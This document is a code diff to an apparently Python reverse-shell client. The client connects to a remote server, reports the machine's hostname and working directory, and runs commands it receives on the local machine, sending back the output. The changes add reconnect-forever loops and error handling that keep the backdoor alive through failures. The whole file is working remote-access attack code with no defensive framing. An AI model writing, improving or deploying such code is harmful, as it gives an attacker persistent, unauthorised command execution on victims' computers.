@@ -4,6 +4,12 @@ import subprocess
 import time
 import struct
 
+'''
+TODO:
+connected then ctrl+d => silent...
+
+'''
+SOCK_TIMEOUT = 2
 
 class Client(object):
 
@@ -20,6 +26,7 @@ class Client(object):
         except socket.error as e:
             print("Socket creation error" + str(e))
             return
+        return
 
     def socket_connect(self):
         """ Connect to a remote socket """
@@ -28,22 +35,26 @@ class Client(object):
         except socket.error as e:
             print("Socket connection error: " + str(e))
             time.sleep(5)
-            self.socket_connect()
+            raise
         try:
             self.socket.send(str.encode(socket.gethostname()))
         except socket.error as e:
             print("Cannot send hostname to server: " + str(e))
-            time.sleep(5)
-            self.socket_connect()
+            raise
         return
 
     def receive_commands(self):
         """ Receive commands from remote server and run on local machine """
-        self.socket.recv(10)
+        try:
+            self.socket.recv(10)
+        except Exception as e:
+            print('Could not start communication with server: %s' %str(e))
+            return
         cwd = str.encode(str(os.getcwd()) + '> ')
         self.socket.send(struct.pack('>I', len(cwd)) + cwd)
         while True:
             data = self.socket.recv(20480)
+            if data == b'': break
             if data[:2].decode("utf-8") == 'cd':
                 try:
                     os.chdir(data[3:].decode("utf-8"))
@@ -67,20 +78,28 @@ class Client(object):
                     self.socket.send(str.encode(output_str + str(os.getcwd()) + '> '))
                     print(output_str)
         self.socket.close()
+        return
 
 
 def main():
     client = Client()
     client.socket_create()
-    client.socket_connect()
+    while True:
+        try:
+            client.socket_connect()
+        except:
+            # TODO: log error
+            time.sleep(5)     
+        else:
+            break    
     try:
         client.receive_commands()
     except Exception as e:
         print('Error in main: ' + str(e))
-        time.sleep(5)
     client.socket.close()
-    main()
+    return
 
 
 if __name__ == '__main__':
-    main()
+    while True:
+        main()
